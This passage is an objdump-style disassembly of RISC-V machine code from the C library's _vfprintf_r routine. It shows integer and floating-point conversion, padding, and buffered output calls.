   113a8:	fb65                	bnez	a4,11398 <_vfprintf_r+0xaf4>
   113aa:	04047713          	andi	a4,s0,64
   113ae:	c711                	beqz	a4,113ba <_vfprintf_r+0xb16>
   113b0:	02815703          	lhu	a4,40(sp)
   113b4:	00e79023          	sh	a4,0(a5)
   113b8:	b7d5                	j	1139c <_vfprintf_r+0xaf8>
   113ba:	20047413          	andi	s0,s0,512
   113be:	c411                	beqz	s0,113ca <_vfprintf_r+0xb26>
   113c0:	02814703          	lbu	a4,40(sp)
   113c4:	00e78023          	sb	a4,0(a5)
   113c8:	bfd1                	j	1139c <_vfprintf_r+0xaf8>
   113ca:	5722                	lw	a4,40(sp)
   113cc:	c398                	sw	a4,0(a5)
   113ce:	b7f9                	j	1139c <_vfprintf_r+0xaf8>
   113d0:	01046413          	ori	s0,s0,16
   113d4:	2401                	sext.w	s0,s0
   113d6:	008b8793          	addi	a5,s7,8
   113da:	f83e                	sd	a5,48(sp)
   113dc:	02047793          	andi	a5,s0,32
   113e0:	cb85                	beqz	a5,11410 <_vfprintf_r+0xb6c>
   113e2:	000bbb83          	ld	s7,0(s7)
   113e6:	bff47413          	andi	s0,s0,-1025
   113ea:	2401                	sext.w	s0,s0
   113ec:	4781                	li	a5,0
   113ee:	0c0107a3          	sb	zero,207(sp)
   113f2:	577d                	li	a4,-1
   113f4:	12ed8c63          	beq	s11,a4,1152c <_vfprintf_r+0xc88>
   113f8:	8722                	mv	a4,s0
   113fa:	f7f47413          	andi	s0,s0,-129
   113fe:	2401                	sext.w	s0,s0
   11400:	120b9663          	bnez	s7,1152c <_vfprintf_r+0xc88>
   11404:	200d8463          	beqz	s11,1160c <_vfprintf_r+0xd68>
   11408:	4705                	li	a4,1
   1140a:	12e79463          	bne	a5,a4,11532 <_vfprintf_r+0xc8e>
   1140e:	bc05                	j	10e3e <_vfprintf_r+0x59a>
   11410:	01047793          	andi	a5,s0,16
   11414:	f7f9                	bnez	a5,113e2 <_vfprintf_r+0xb3e>
   11416:	04047793          	andi	a5,s0,64
   1141a:	000bab83          	lw	s7,0(s7)
   1141e:	c789                	beqz	a5,11428 <_vfprintf_r+0xb84>
   11420:	1bc2                	slli	s7,s7,0x30
   11422:	030bdb93          	srli	s7,s7,0x30
   11426:	b7c1                	j	113e6 <_vfprintf_r+0xb42>
   11428:	20047793          	andi	a5,s0,512
   1142c:	c781                	beqz	a5,11434 <_vfprintf_r+0xb90>
   1142e:	0ffbfb93          	andi	s7,s7,255
   11432:	bf55                	j	113e6 <_vfprintf_r+0xb42>
   11434:	1b82                	slli	s7,s7,0x20
   11436:	020bdb93          	srli	s7,s7,0x20
   1143a:	b775                	j	113e6 <_vfprintf_r+0xb42>
   1143c:	008b8793          	addi	a5,s7,8
   11440:	f83e                	sd	a5,48(sp)
   11442:	77e1                	lui	a5,0xffff8
   11444:	8307c793          	xori	a5,a5,-2000
   11448:	0cf11823          	sh	a5,208(sp)
   1144c:	0001a7b7          	lui	a5,0x1a
   11450:	29078793          	addi	a5,a5,656 # 1a290 <zeroes.4441+0x60>
   11454:	00246413          	ori	s0,s0,2
   11458:	f0be                	sd	a5,96(sp)
   1145a:	000bbb83          	ld	s7,0(s7)
   1145e:	2401                	sext.w	s0,s0
   11460:	4789                	li	a5,2
   11462:	07800b13          	li	s6,120
   11466:	b761                	j	113ee <_vfprintf_r+0xb4a>
   11468:	008b8793          	addi	a5,s7,8
   1146c:	f83e                	sd	a5,48(sp)
   1146e:	0c0107a3          	sb	zero,207(sp)
   11472:	57fd                	li	a5,-1
   11474:	000bb483          	ld	s1,0(s7)
   11478:	00fd8e63          	beq	s11,a5,11494 <_vfprintf_r+0xbf0>
   1147c:	866e                	mv	a2,s11
   1147e:	4581                	li	a1,0
   11480:	8526                	mv	a0,s1
   11482:	404030ef          	jal	ra,14886 <memchr>
   11486:	8baa                	mv	s7,a0
   11488:	a40503e3          	beqz	a0,10ece <_vfprintf_r+0x62a>
   1148c:	40950dbb          	subw	s11,a0,s1
   11490:	4b81                	li	s7,0
   11492:	bc35                	j	10ece <_vfprintf_r+0x62a>
   11494:	8526                	mv	a0,s1
   11496:	bfcff0ef          	jal	ra,10892 <strlen>
   1149a:	00050d9b          	sext.w	s11,a0
   1149e:	bfcd                	j	11490 <_vfprintf_r+0xbec>
   114a0:	01046413          	ori	s0,s0,16
   114a4:	2401                	sext.w	s0,s0
   114a6:	008b8793          	addi	a5,s7,8
   114aa:	f83e                	sd	a5,48(sp)
   114ac:	02047793          	andi	a5,s0,32
   114b0:	c789                	beqz	a5,114ba <_vfprintf_r+0xc16>
   114b2:	000bbb83          	ld	s7,0(s7)
   114b6:	4785                	li	a5,1
   114b8:	bf1d                	j	113ee <_vfprintf_r+0xb4a>
   114ba:	01047793          	andi	a5,s0,16
   114be:	fbf5                	bnez	a5,114b2 <_vfprintf_r+0xc0e>
   114c0:	04047793          	andi	a5,s0,64
   114c4:	000bab83          	lw	s7,0(s7)
   114c8:	c789                	beqz	a5,114d2 <_vfprintf_r+0xc2e>
   114ca:	1bc2                	slli	s7,s7,0x30
   114cc:	030bdb93          	srli	s7,s7,0x30
   114d0:	b7dd                	j	114b6 <_vfprintf_r+0xc12>
   114d2:	20047793          	andi	a5,s0,512
   114d6:	c781                	beqz	a5,114de <_vfprintf_r+0xc3a>
   114d8:	0ffbfb93          	andi	s7,s7,255
   114dc:	bfe9                	j	114b6 <_vfprintf_r+0xc12>
   114de:	1b82                	slli	s7,s7,0x20
   114e0:	020bdb93          	srli	s7,s7,0x20
   114e4:	bfc9                	j	114b6 <_vfprintf_r+0xc12>
   114e6:	0001a7b7          	lui	a5,0x1a
   114ea:	29078793          	addi	a5,a5,656 # 1a290 <zeroes.4441+0x60>
   114ee:	d9eff06f          	j	10a8c <_vfprintf_r+0x1e8>
   114f2:	01047793          	andi	a5,s0,16
   114f6:	da079363          	bnez	a5,10a9c <_vfprintf_r+0x1f8>
   114fa:	04047793          	andi	a5,s0,64
   114fe:	000bab83          	lw	s7,0(s7)
   11502:	c791                	beqz	a5,1150e <_vfprintf_r+0xc6a>
   11504:	1bc2                	slli	s7,s7,0x30
   11506:	030bdb93          	srli	s7,s7,0x30
   1150a:	d96ff06f          	j	10aa0 <_vfprintf_r+0x1fc>
   1150e:	20047793          	andi	a5,s0,512
   11512:	c789                	beqz	a5,1151c <_vfprintf_r+0xc78>
   11514:	0ffbfb93          	andi	s7,s7,255
   11518:	d88ff06f          	j	10aa0 <_vfprintf_r+0x1fc>
   1151c:	1b82                	slli	s7,s7,0x20
   1151e:	020bdb93          	srli	s7,s7,0x20
   11522:	d7eff06f          	j	10aa0 <_vfprintf_r+0x1fc>
   11526:	8722                	mv	a4,s0
   11528:	4785                	li	a5,1
   1152a:	bdc1                	j	113fa <_vfprintf_r+0xb56>
   1152c:	4705                	li	a4,1
   1152e:	90e785e3          	beq	a5,a4,10e38 <_vfprintf_r+0x594>
   11532:	4709                	li	a4,2
   11534:	0ae78d63          	beq	a5,a4,115ee <_vfprintf_r+0xd4a>
   11538:	1afc                	addi	a5,sp,380
   1153a:	007bf713          	andi	a4,s7,7
   1153e:	03070713          	addi	a4,a4,48
   11542:	fee78fa3          	sb	a4,-1(a5)
   11546:	003bdb93          	srli	s7,s7,0x3
   1154a:	fff78493          	addi	s1,a5,-1
   1154e:	020b9863          	bnez	s7,1157e <_vfprintf_r+0xcda>
   11552:	00147693          	andi	a3,s0,1
   11556:	ca89                	beqz	a3,11568 <_vfprintf_r+0xcc4>
   11558:	03000693          	li	a3,48
   1155c:	00d70663          	beq	a4,a3,11568 <_vfprintf_r+0xcc4>
   11560:	fed48fa3          	sb	a3,-1(s1)
   11564:	ffe78493          	addi	s1,a5,-2
   11568:	17c10e13          	addi	t3,sp,380
   1156c:	876e                	mv	a4,s11
   1156e:	4b81                	li	s7,0
   11570:	409e0dbb          	subw	s11,t3,s1
   11574:	e402                	sd	zero,8(sp)
   11576:	4c01                	li	s8,0
   11578:	4d01                	li	s10,0
   1157a:	e8eff06f          	j	10c08 <_vfprintf_r+0x364>
   1157e:	87a6                	mv	a5,s1
   11580:	bf6d                	j	1153a <_vfprintf_r+0xc96>
   11582:	40047c13          	andi	s8,s0,1024
   11586:	4a01                	li	s4,0
   11588:	1afc                	addi	a5,sp,380
   1158a:	4d29                	li	s10,10
   1158c:	2c01                	sext.w	s8,s8
   1158e:	0ff00693          	li	a3,255
   11592:	4825                	li	a6,9
   11594:	03abf733          	remu	a4,s7,s10
   11598:	fff78493          	addi	s1,a5,-1
   1159c:	2a05                	addiw	s4,s4,1
   1159e:	0307071b          	addiw	a4,a4,48
   115a2:	fee78fa3          	sb	a4,-1(a5)
   115a6:	020c0e63          	beqz	s8,115e2 <_vfprintf_r+0xd3e>
   115aa:	6782                	ld	a5,0(sp)
   115ac:	0007c783          	lbu	a5,0(a5)
   115b0:	02fa1963          	bne	s4,a5,115e2 <_vfprintf_r+0xd3e>
   115b4:	02d78763          	beq	a5,a3,115e2 <_vfprintf_r+0xd3e>
   115b8:	03787563          	bleu	s7,a6,115e2 <_vfprintf_r+0xd3e>
   115bc:	6786                	ld	a5,64(sp)
   115be:	65c6                	ld	a1,80(sp)
   115c0:	fc42                	sd	a6,56(sp)
   115c2:	8c9d                	sub	s1,s1,a5
   115c4:	863e                	mv	a2,a5
   115c6:	8526                	mv	a0,s1
   115c8:	e436                	sd	a3,8(sp)
   115ca:	4a6040ef          	jal	ra,15a70 <strncpy>
   115ce:	6782                	ld	a5,0(sp)
   115d0:	4a01                	li	s4,0
   115d2:	66a2                	ld	a3,8(sp)
   115d4:	0017c783          	lbu	a5,1(a5)
   115d8:	7862                	ld	a6,56(sp)
   115da:	c781                	beqz	a5,115e2 <_vfprintf_r+0xd3e>
   115dc:	6782                	ld	a5,0(sp)
   115de:	0785                	addi	a5,a5,1
   115e0:	e03e                	sd	a5,0(sp)
   115e2:	03abdbb3          	divu	s7,s7,s10
   115e6:	f80b81e3          	beqz	s7,11568 <_vfprintf_r+0xcc4>
   115ea:	87a6                	mv	a5,s1
   115ec:	b765                	j	11594 <_vfprintf_r+0xcf0>
   115ee:	1ae4                	addi	s1,sp,380
   115f0:	7706                	ld	a4,96(sp)
   115f2:	00fbf793          	andi	a5,s7,15
   115f6:	14fd                	addi	s1,s1,-1
   115f8:	97ba                	add	a5,a5,a4
   115fa:	0007c783          	lbu	a5,0(a5)
   115fe:	004bdb93          	srli	s7,s7,0x4
   11602:	00f48023          	sb	a5,0(s1)
   11606:	fe0b95e3          	bnez	s7,115f0 <_vfprintf_r+0xd4c>
   1160a:	bfb9                	j	11568 <_vfprintf_r+0xcc4>
   1160c:	1ae4                	addi	s1,sp,380
   1160e:	ffa9                	bnez	a5,11568 <_vfprintf_r+0xcc4>
   11610:	8b05                	andi	a4,a4,1
   11612:	db39                	beqz	a4,11568 <_vfprintf_r+0xcc4>
   11614:	03000793          	li	a5,48
   11618:	16f10da3          	sb	a5,379(sp)
   1161c:	82bff06f          	j	10e46 <_vfprintf_r+0x5a2>
   11620:	020b02e3          	beqz	s6,11e44 <_vfprintf_r+0x15a0>
   11624:	11610c23          	sb	s6,280(sp)
   11628:	0c0107a3          	sb	zero,207(sp)
   1162c:	f85e                	sd	s7,48(sp)
   1162e:	dccff06f          	j	10bfa <_vfprintf_r+0x356>
   11632:	0641                	addi	a2,a2,16
   11634:	011cb423          	sd	a7,8(s9)
   11638:	ea32                	sd	a2,272(sp)
   1163a:	10b12423          	sw	a1,264(sp)
   1163e:	02aed463          	ble	a0,t4,11666 <_vfprintf_r+0xdc2>
   11642:	0210                	addi	a2,sp,256
   11644:	85ca                	mv	a1,s2
   11646:	854e                	mv	a0,s3
   11648:	fd76                	sd	t4,184(sp)
   1164a:	f942                	sd	a6,176(sp)
   1164c:	e546                	sd	a7,136(sp)
   1164e:	e13a                	sd	a4,128(sp)
   11650:	fcb6                	sd	a3,120(sp)
   11652:	1c7050ef          	jal	ra,17018 <__sprint_r>
   11656:	7a051863          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   1165a:	7eea                	ld	t4,184(sp)
   1165c:	784a                	ld	a6,176(sp)
   1165e:	68aa                	ld	a7,136(sp)
   11660:	670a                	ld	a4,128(sp)
   11662:	76e6                	ld	a3,120(sp)
   11664:	8f56                	mv	t5,s5
   11666:	36c1                	addiw	a3,a3,-16
   11668:	8cfa                	mv	s9,t5
   1166a:	de8ff06f          	j	10c52 <_vfprintf_r+0x3ae>
   1166e:	0641                	addi	a2,a2,16
   11670:	011cb423          	sd	a7,8(s9)
   11674:	ea32                	sd	a2,272(sp)
   11676:	10b12423          	sw	a1,264(sp)
   1167a:	02aed463          	ble	a0,t4,116a2 <_vfprintf_r+0xdfe>
   1167e:	0210                	addi	a2,sp,256
   11680:	85ca                	mv	a1,s2
   11682:	854e                	mv	a0,s3
   11684:	e576                	sd	t4,136(sp)
   11686:	e142                	sd	a6,128(sp)
   11688:	fcc6                	sd	a7,120(sp)
   1168a:	f8ba                	sd	a4,112(sp)
   1168c:	f4b6                	sd	a3,104(sp)
   1168e:	18b050ef          	jal	ra,17018 <__sprint_r>
   11692:	76051a63          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11696:	6eaa                	ld	t4,136(sp)
   11698:	680a                	ld	a6,128(sp)
   1169a:	78e6                	ld	a7,120(sp)
   1169c:	7746                	ld	a4,112(sp)
   1169e:	76a6                	ld	a3,104(sp)
   116a0:	8f56                	mv	t5,s5
   116a2:	36c1                	addiw	a3,a3,-16
   116a4:	8cfa                	mv	s9,t5
   116a6:	e92ff06f          	j	10d38 <_vfprintf_r+0x494>
   116aa:	06c1                	addi	a3,a3,16
   116ac:	011cb423          	sd	a7,8(s9)
   116b0:	ea36                	sd	a3,272(sp)
   116b2:	10c12423          	sw	a2,264(sp)
   116b6:	02bed263          	ble	a1,t4,116da <_vfprintf_r+0xe36>
   116ba:	0210                	addi	a2,sp,256
   116bc:	85ca                	mv	a1,s2
   116be:	854e                	mv	a0,s3
   116c0:	e176                	sd	t4,128(sp)
   116c2:	fcc2                	sd	a6,120(sp)
   116c4:	f8c6                	sd	a7,112(sp)
   116c6:	f4ba                	sd	a4,104(sp)
   116c8:	151050ef          	jal	ra,17018 <__sprint_r>
   116cc:	72051d63          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   116d0:	6e8a                	ld	t4,128(sp)
   116d2:	7866                	ld	a6,120(sp)
   116d4:	78c6                	ld	a7,112(sp)
   116d6:	7726                	ld	a4,104(sp)
   116d8:	8556                	mv	a0,s5
   116da:	3741                	addiw	a4,a4,-16
   116dc:	8caa                	mv	s9,a0
   116de:	eaeff06f          	j	10d8c <_vfprintf_r+0x4e8>
   116e2:	06500693          	li	a3,101
   116e6:	5766df63          	ble	s6,a3,11c64 <_vfprintf_r+0x13c0>
   116ea:	754e                	ld	a0,240(sp)
   116ec:	75ee                	ld	a1,248(sp)
   116ee:	4601                	li	a2,0
   116f0:	4681                	li	a3,0
   116f2:	f4ba                	sd	a4,104(sp)
   116f4:	3ca070ef          	jal	ra,18abe <__eqtf2>
   116f8:	7726                	ld	a4,104(sp)
   116fa:	10051e63          	bnez	a0,11816 <_vfprintf_r+0xf72>
   116fe:	0001a7b7          	lui	a5,0x1a
   11702:	2c078793          	addi	a5,a5,704 # 1a2c0 <zeroes.4441+0x90>
   11706:	00fcb023          	sd	a5,0(s9)
   1170a:	4785                	li	a5,1
   1170c:	00fcb423          	sd	a5,8(s9)
   11710:	10812783          	lw	a5,264(sp)
   11714:	0705                	addi	a4,a4,1
   11716:	ea3a                	sd	a4,272(sp)
   11718:	0017871b          	addiw	a4,a5,1
   1171c:	10e12423          	sw	a4,264(sp)
   11720:	479d                	li	a5,7
   11722:	0cc1                	addi	s9,s9,16
   11724:	00e7da63          	ble	a4,a5,11738 <_vfprintf_r+0xe94>
   11728:	0210                	addi	a2,sp,256
   1172a:	85ca                	mv	a1,s2
   1172c:	854e                	mv	a0,s3
   1172e:	0eb050ef          	jal	ra,17018 <__sprint_r>
   11732:	6c051a63          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11736:	8cd6                	mv	s9,s5
   11738:	47ee                	lw	a5,216(sp)
   1173a:	0147c563          	blt	a5,s4,11744 <_vfprintf_r+0xea0>
   1173e:	00147793          	andi	a5,s0,1
   11742:	cfa5                	beqz	a5,117ba <_vfprintf_r+0xf16>
   11744:	67a6                	ld	a5,72(sp)
   11746:	6762                	ld	a4,24(sp)
   11748:	0cc1                	addi	s9,s9,16
   1174a:	fefcb823          	sd	a5,-16(s9)
   1174e:	67e2                	ld	a5,24(sp)
   11750:	fefcbc23          	sd	a5,-8(s9)
   11754:	67d2                	ld	a5,272(sp)
   11756:	97ba                	add	a5,a5,a4
   11758:	ea3e                	sd	a5,272(sp)
   1175a:	10812783          	lw	a5,264(sp)
   1175e:	0017871b          	addiw	a4,a5,1
   11762:	10e12423          	sw	a4,264(sp)
   11766:	479d                	li	a5,7
   11768:	00e7da63          	ble	a4,a5,1177c <_vfprintf_r+0xed8>
   1176c:	0210                	addi	a2,sp,256
   1176e:	85ca                	mv	a1,s2
   11770:	854e                	mv	a0,s3
   11772:	0a7050ef          	jal	ra,17018 <__sprint_r>
   11776:	68051863          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   1177a:	8cd6                	mv	s9,s5
   1177c:	fffa049b          	addiw	s1,s4,-1
   11780:	02905d63          	blez	s1,117ba <_vfprintf_r+0xf16>
   11784:	6b69                	lui	s6,0x1a
   11786:	4c41                	li	s8,16
   11788:	230b0b13          	addi	s6,s6,560 # 1a230 <zeroes.4441>
   1178c:	4d1d                	li	s10,7
   1178e:	10812703          	lw	a4,264(sp)
   11792:	016cb023          	sd	s6,0(s9)
   11796:	67d2                	ld	a5,272(sp)
   11798:	0017069b          	addiw	a3,a4,1
   1179c:	8736                	mv	a4,a3
   1179e:	010c8613          	addi	a2,s9,16
   117a2:	049c4763          	blt	s8,s1,117f0 <_vfprintf_r+0xf4c>
   117a6:	009cb423          	sd	s1,8(s9)
   117aa:	94be                	add	s1,s1,a5
   117ac:	ea26                	sd	s1,272(sp)
   117ae:	10d12423          	sw	a3,264(sp)
   117b2:	479d                	li	a5,7
   117b4:	8cb2                	mv	s9,a2
   117b6:	e4d7c063          	blt	a5,a3,10df6 <_vfprintf_r+0x552>
   117ba:	8811                	andi	s0,s0,4
   117bc:	60041063          	bnez	s0,11dbc <_vfprintf_r+0x1518>
   117c0:	7702                	ld	a4,32(sp)
   117c2:	76e2                	ld	a3,56(sp)
   117c4:	5782                	lw	a5,32(sp)
   117c6:	00d75363          	ble	a3,a4,117cc <_vfprintf_r+0xf28>
   117ca:	57e2                	lw	a5,56(sp)
   117cc:	5722                	lw	a4,40(sp)
   117ce:	9fb9                	addw	a5,a5,a4
   117d0:	f43e                	sd	a5,40(sp)
   117d2:	67d2                	ld	a5,272(sp)
   117d4:	cb81                	beqz	a5,117e4 <_vfprintf_r+0xf40>
   117d6:	0210                	addi	a2,sp,256
   117d8:	85ca                	mv	a1,s2
   117da:	854e                	mv	a0,s3
   117dc:	03d050ef          	jal	ra,17018 <__sprint_r>
   117e0:	62051363          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   117e4:	10012423          	sw	zero,264(sp)
   117e8:	640b9963          	bnez	s7,11e3a <_vfprintf_r+0x1596>
   117ec:	8cd6                	mv	s9,s5
   117ee:	b67d                	j	1139c <_vfprintf_r+0xaf8>
   117f0:	07c1                	addi	a5,a5,16
   117f2:	018cb423          	sd	s8,8(s9)
   117f6:	ea3e                	sd	a5,272(sp)
   117f8:	10e12423          	sw	a4,264(sp)
   117fc:	00dd5a63          	ble	a3,s10,11810 <_vfprintf_r+0xf6c>
   11800:	0210                	addi	a2,sp,256
   11802:	85ca                	mv	a1,s2
   11804:	854e                	mv	a0,s3
   11806:	013050ef          	jal	ra,17018 <__sprint_r>
   1180a:	5e051e63          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   1180e:	8656                	mv	a2,s5
   11810:	34c1                	addiw	s1,s1,-16
   11812:	8cb2                	mv	s9,a2
   11814:	bfad                	j	1178e <_vfprintf_r+0xeea>
   11816:	46ee                	lw	a3,216(sp)
   11818:	12d04163          	bgtz	a3,1193a <_vfprintf_r+0x1096>
   1181c:	0001a7b7          	lui	a5,0x1a
   11820:	2c078793          	addi	a5,a5,704 # 1a2c0 <zeroes.4441+0x90>
   11824:	00fcb023          	sd	a5,0(s9)
   11828:	4785                	li	a5,1
   1182a:	00fcb423          	sd	a5,8(s9)
   1182e:	10812783          	lw	a5,264(sp)
   11832:	0705                	addi	a4,a4,1
   11834:	ea3a                	sd	a4,272(sp)
   11836:	0017871b          	addiw	a4,a5,1
   1183a:	10e12423          	sw	a4,264(sp)
   1183e:	479d                	li	a5,7
   11840:	0cc1                	addi	s9,s9,16
   11842:	00e7da63          	ble	a4,a5,11856 <_vfprintf_r+0xfb2>
   11846:	0210                	addi	a2,sp,256
   11848:	85ca                	mv	a1,s2
   1184a:	854e                	mv	a0,s3
   1184c:	7cc050ef          	jal	ra,17018 <__sprint_r>
   11850:	5a051b63          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11854:	8cd6                	mv	s9,s5
   11856:	47ee                	lw	a5,216(sp)
   11858:	e791                	bnez	a5,11864 <_vfprintf_r+0xfc0>
   1185a:	000a1563          	bnez	s4,11864 <_vfprintf_r+0xfc0>
   1185e:	00147793          	andi	a5,s0,1
   11862:	dfa1                	beqz	a5,117ba <_vfprintf_r+0xf16>
   11864:	67a6                	ld	a5,72(sp)
   11866:	6762                	ld	a4,24(sp)
   11868:	010c8313          	addi	t1,s9,16
   1186c:	00fcb023          	sd	a5,0(s9)
   11870:	67e2                	ld	a5,24(sp)
   11872:	00fcb423          	sd	a5,8(s9)
   11876:	67d2                	ld	a5,272(sp)
   11878:	97ba                	add	a5,a5,a4
   1187a:	ea3e                	sd	a5,272(sp)
   1187c:	10812783          	lw	a5,264(sp)
   11880:	0017871b          	addiw	a4,a5,1
   11884:	10e12423          	sw	a4,264(sp)
   11888:	479d                	li	a5,7
   1188a:	00e7da63          	ble	a4,a5,1189e <_vfprintf_r+0xffa>
   1188e:	0210                	addi	a2,sp,256
   11890:	85ca                	mv	a1,s2
   11892:	854e                	mv	a0,s3
   11894:	784050ef          	jal	ra,17018 <__sprint_r>
   11898:	56051763          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   1189c:	8356                	mv	t1,s5
   1189e:	4b6e                	lw	s6,216(sp)
   118a0:	040b5663          	bgez	s6,118ec <_vfprintf_r+0x1048>
   118a4:	6c69                	lui	s8,0x1a
   118a6:	41600b3b          	negw	s6,s6
   118aa:	879a                	mv	a5,t1
   118ac:	4d41                	li	s10,16
   118ae:	230c0c13          	addi	s8,s8,560 # 1a230 <zeroes.4441>
   118b2:	4c9d                	li	s9,7
   118b4:	10812683          	lw	a3,264(sp)
   118b8:	0187b023          	sd	s8,0(a5)
   118bc:	6752                	ld	a4,272(sp)
   118be:	0016861b          	addiw	a2,a3,1
   118c2:	86b2                	mv	a3,a2
   118c4:	0341                	addi	t1,t1,16
   118c6:	056d4763          	blt	s10,s6,11914 <_vfprintf_r+0x1070>
   118ca:	0167b423          	sd	s6,8(a5)
   118ce:	9b3a                	add	s6,s6,a4
   118d0:	ea5a                	sd	s6,272(sp)
   118d2:	10c12423          	sw	a2,264(sp)
   118d6:	479d                	li	a5,7
   118d8:	00c7da63          	ble	a2,a5,118ec <_vfprintf_r+0x1048>
   118dc:	0210                	addi	a2,sp,256
   118de:	85ca                	mv	a1,s2
   118e0:	854e                	mv	a0,s3
   118e2:	736050ef          	jal	ra,17018 <__sprint_r>
   118e6:	52051063          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   118ea:	8356                	mv	t1,s5
   118ec:	67d2                	ld	a5,272(sp)
   118ee:	00933023          	sd	s1,0(t1) # 0 <_start-0x100b0>
   118f2:	01433423          	sd	s4,8(t1)
   118f6:	97d2                	add	a5,a5,s4
   118f8:	ea3e                	sd	a5,272(sp)
   118fa:	10812783          	lw	a5,264(sp)
   118fe:	01030c93          	addi	s9,t1,16
   11902:	0017871b          	addiw	a4,a5,1
   11906:	10e12423          	sw	a4,264(sp)
   1190a:	479d                	li	a5,7
   1190c:	eae7d7e3          	ble	a4,a5,117ba <_vfprintf_r+0xf16>
   11910:	ce6ff06f          	j	10df6 <_vfprintf_r+0x552>
   11914:	0741                	addi	a4,a4,16
   11916:	01a7b423          	sd	s10,8(a5)
   1191a:	ea3a                	sd	a4,272(sp)
   1191c:	10d12423          	sw	a3,264(sp)
   11920:	00ccda63          	ble	a2,s9,11934 <_vfprintf_r+0x1090>
   11924:	0210                	addi	a2,sp,256
   11926:	85ca                	mv	a1,s2
   11928:	854e                	mv	a0,s3
   1192a:	6ee050ef          	jal	ra,17018 <__sprint_r>
   1192e:	4c051c63          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11932:	8356                	mv	t1,s5
   11934:	3b41                	addiw	s6,s6,-16
   11936:	879a                	mv	a5,t1
   11938:	bfb5                	j	118b4 <_vfprintf_r+0x1010>
   1193a:	000d0b1b          	sext.w	s6,s10
   1193e:	01aa5463          	ble	s10,s4,11946 <_vfprintf_r+0x10a2>
   11942:	000a0b1b          	sext.w	s6,s4
   11946:	03605a63          	blez	s6,1197a <_vfprintf_r+0x10d6>
   1194a:	975a                	add	a4,a4,s6
   1194c:	ea3a                	sd	a4,272(sp)
   1194e:	10812703          	lw	a4,264(sp)
   11952:	009cb023          	sd	s1,0(s9)
   11956:	016cb423          	sd	s6,8(s9)
   1195a:	0017069b          	addiw	a3,a4,1
   1195e:	10d12423          	sw	a3,264(sp)
   11962:	471d                	li	a4,7
   11964:	0cc1                	addi	s9,s9,16
   11966:	00d75a63          	ble	a3,a4,1197a <_vfprintf_r+0x10d6>
   1196a:	0210                	addi	a2,sp,256
   1196c:	85ca                	mv	a1,s2
   1196e:	854e                	mv	a0,s3
   11970:	6a8050ef          	jal	ra,17018 <__sprint_r>
   11974:	48051963          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11978:	8cd6                	mv	s9,s5
   1197a:	875a                	mv	a4,s6
   1197c:	000b5363          	bgez	s6,11982 <_vfprintf_r+0x10de>
   11980:	4701                	li	a4,0
   11982:	40ed0b3b          	subw	s6,s10,a4
   11986:	05605563          	blez	s6,119d0 <_vfprintf_r+0x112c>
   1198a:	66e9                	lui	a3,0x1a
   1198c:	4841                	li	a6,16
   1198e:	23068d93          	addi	s11,a3,560 # 1a230 <zeroes.4441>
   11992:	489d                	li	a7,7
   11994:	10812603          	lw	a2,264(sp)
   11998:	01bcb023          	sd	s11,0(s9)
   1199c:	6752                	ld	a4,272(sp)
   1199e:	0016059b          	addiw	a1,a2,1
   119a2:	862e                	mv	a2,a1
   119a4:	010c8513          	addi	a0,s9,16
   119a8:	15684263          	blt	a6,s6,11aec <_vfprintf_r+0x1248>
   119ac:	016cb423          	sd	s6,8(s9)
   119b0:	9b3a                	add	s6,s6,a4
   119b2:	ea5a                	sd	s6,272(sp)
   119b4:	10b12423          	sw	a1,264(sp)
   119b8:	471d                	li	a4,7
   119ba:	8caa                	mv	s9,a0
   119bc:	00b75a63          	ble	a1,a4,119d0 <_vfprintf_r+0x112c>
   119c0:	0210                	addi	a2,sp,256
   119c2:	85ca                	mv	a1,s2
   119c4:	854e                	mv	a0,s3
   119c6:	652050ef          	jal	ra,17018 <__sprint_r>
   119ca:	42051e63          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   119ce:	8cd6                	mv	s9,s5
   119d0:	40047793          	andi	a5,s0,1024
   119d4:	01a48b33          	add	s6,s1,s10
   119d8:	c39d                	beqz	a5,119fe <_vfprintf_r+0x115a>
   119da:	014487b3          	add	a5,s1,s4
   119de:	f4be                	sd	a5,104(sp)
   119e0:	67e9                	lui	a5,0x1a
   119e2:	23078793          	addi	a5,a5,560 # 1a230 <zeroes.4441>
   119e6:	4d9d                	li	s11,7
   119e8:	8d3e                	mv	s10,a5
   119ea:	67a2                	ld	a5,8(sp)
   119ec:	120c1763          	bnez	s8,11b1a <_vfprintf_r+0x1276>
   119f0:	12079663          	bnez	a5,11b1c <_vfprintf_r+0x1278>
   119f4:	014487b3          	add	a5,s1,s4
   119f8:	0167f363          	bleu	s6,a5,119fe <_vfprintf_r+0x115a>
   119fc:	8b3e                	mv	s6,a5
   119fe:	47ee                	lw	a5,216(sp)
   11a00:	0147c563          	blt	a5,s4,11a0a <_vfprintf_r+0x1166>
   11a04:	00147793          	andi	a5,s0,1
   11a08:	cf8d                	beqz	a5,11a42 <_vfprintf_r+0x119e>
   11a0a:	67a6                	ld	a5,72(sp)
   11a0c:	6762                	ld	a4,24(sp)
   11a0e:	0cc1                	addi	s9,s9,16
   11a10:	fefcb823          	sd	a5,-16(s9)
   11a14:	67e2                	ld	a5,24(sp)
   11a16:	fefcbc23          	sd	a5,-8(s9)
   11a1a:	67d2                	ld	a5,272(sp)
   11a1c:	97ba                	add	a5,a5,a4
   11a1e:	ea3e                	sd	a5,272(sp)
   11a20:	10812783          	lw	a5,264(sp)
   11a24:	0017871b          	addiw	a4,a5,1
   11a28:	10e12423          	sw	a4,264(sp)
   11a2c:	479d                	li	a5,7
   11a2e:	00e7da63          	ble	a4,a5,11a42 <_vfprintf_r+0x119e>
   11a32:	0210                	addi	a2,sp,256
   11a34:	85ca                	mv	a1,s2
   11a36:	854e                	mv	a0,s3
   11a38:	5e0050ef          	jal	ra,17018 <__sprint_r>
   11a3c:	3c051563          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11a40:	8cd6                	mv	s9,s5
   11a42:	4c6e                	lw	s8,216(sp)
